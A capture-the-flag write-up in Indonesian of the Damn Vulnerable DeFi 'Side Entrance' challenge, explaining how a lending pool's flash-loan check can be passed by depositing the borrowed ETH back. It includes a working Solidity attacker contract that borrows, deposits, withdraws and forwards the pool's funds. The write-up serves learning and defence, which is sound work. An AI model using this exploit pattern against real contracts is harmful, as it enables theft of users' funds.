# Damn Vulnerable DeFi — Side Entrance (Writeup)

> Status: **SOLVED** ✅ (`[PASS] test_sideEntrance`)
> Goal: kuras 1000 ETH dari `SideEntranceLenderPool`, pindahin semua ke `recovery`.

---

## 1. Kontrak target

`SideEntranceLenderPool` nyimpen ETH dan punya 3 fungsi:

```solidity
mapping(address => uint256) private balances;

function deposit() external payable {
    balances[msg.sender] += msg.value;      // catet setoran di mapping
}

function withdraw() external {
    uint256 amount = balances[msg.sender];
    balances[msg.sender] = 0;
    (bool ok,) = msg.sender.call{value: amount}("");   // balikin setoran
    ...
}

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();  // pinjemin ETH
    if (address(this).balance < balanceBefore) revert RepayFailed();  // cek balik
}
```

---

## 2. Bug-nya

Perhatiin `flashLoan` cuma ngecek **total saldo ETH kontrak** (`address(this).balance`) di akhir.

Tapi ada **2 cara** ETH masuk ke kontrak:
1. Repay flash loan (kirim ETH balik langsung).
2. **`deposit()`** — juga naikin saldo ETH kontrak, TAPI sekaligus nyatet `balances[kita]` naik.

Jadi kalau ETH pinjaman kita **`deposit()`-in balik**:
- Saldo ETH kontrak balik ke semula → cek `flashLoan` **lolos** (gak revert).
- Tapi `balances[kita]` sekarang tercatat = jumlah pinjaman. 😈

Padahal itu ETH-nya pool sendiri — kita "ngaku-ngaku" udah nyetor.
Terus tinggal `withdraw()` buat narik semuanya.

---

## 3. Alur serangan

1. `flashLoan(1000 ETH)` → pool kirim 1000 ETH ke kita via callback `execute()`.
2. Di dalam `execute()`, langsung `deposit{value: 1000 ETH}()` → ETH balik ke pool, tapi `balances[kita] = 1000`.
3. Flash loan selesai, cek saldo lolos (pool punya 1000 lagi).
4. `withdraw()` → tarik 1000 ETH (karena `balances[kita] = 1000`).
5. Forward semua ETH ke `recovery`.

---

## 4. Kode solusi

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    attackSide attacker = new attackSide(pool, recovery);
    attacker.attack();
}

contract attackSide {
    SideEntranceLenderPool pool;
    address recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);   // 1. pinjam semua ETH pool
        pool.withdraw();                          // 4. tarik saldo "palsu" kita
        (bool ok,) = recovery.call{value: address(this).balance}("");  // 5. forward ke recovery
        require(ok, "transfer failed");
    }

    // callback flash loan
    function execute() external payable {
        pool.deposit{value: msg.value}();         // 2. deposit balik ETH pinjaman
    }

    receive() external payable {}                 // biar bisa nerima ETH dari withdraw
}
```

---

## 5. Konsep yang dipelajari

- **`.balance` (native ETH) vs mapping `balances`**: bug muncul karena pool percaya `address(this).balance` = uang yang bener-bener "punya" pool, padahal `deposit` bisa naikin saldo TANPA nambah aset baru (cuma muter ETH pinjaman).
- **Flash loan callback**: pool manggil `execute()` di tengah `flashLoan` → di situ kita "nyisipin" `deposit`.
- **`{value: ...}`**: cara ngirim native ETH bareng panggilan fungsi.
- **`receive() external payable`**: fungsi khusus biar kontrak bisa nerima ETH polos (dari `withdraw`).
- **`.call{value:}("")`**: cara transfer ETH ke alamat, cek `ok`.

## 6. Pelajaran keamanan

Jangan ukur "utang lunas" cuma dari total saldo. Fungsi `deposit`/`withdraw` yang share state saldo dengan flash loan bikin attacker bisa "pintu samping" (side entrance) — masukin uang pinjaman lewat jalur lain yang tercatat sebagai kredit. Pisahkan akuntansi flash loan dari deposit biasa.
